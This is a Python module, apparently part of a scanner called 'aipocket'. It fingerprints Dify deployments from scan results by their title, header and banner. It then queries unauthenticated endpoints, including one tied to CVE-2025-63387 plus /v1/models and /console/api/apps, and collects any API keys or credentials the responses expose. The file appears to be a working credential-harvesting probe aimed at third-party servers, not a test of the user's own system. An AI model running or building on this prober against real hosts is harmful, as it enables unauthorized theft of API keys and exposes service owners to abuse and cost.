"""Dify prober — system features + app API key leaks.

Dify exposes:
  - GET /console/api/system-features → unauthenticated system config leak
    (CVE-2025-63387, intentionally public for initial page load)
  - GET /console/api/setup → setup status (confirms it's Dify)
  - GET /v1/models → some Dify instances proxy this without auth
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import Prober

log = logging.getLogger(__name__)


class DifyProber(Prober):
    product_name = "dify"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "dify" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        for path in (
            "/console/api/system-features",  # CVE-2025-63387 — always public
            "/console/api/setup",            # setup status
            "/v1/models",                    # sometimes proxied
            "/console/api/apps",             # app list (sometimes misconfigured)
        ):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"dify_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        return creds
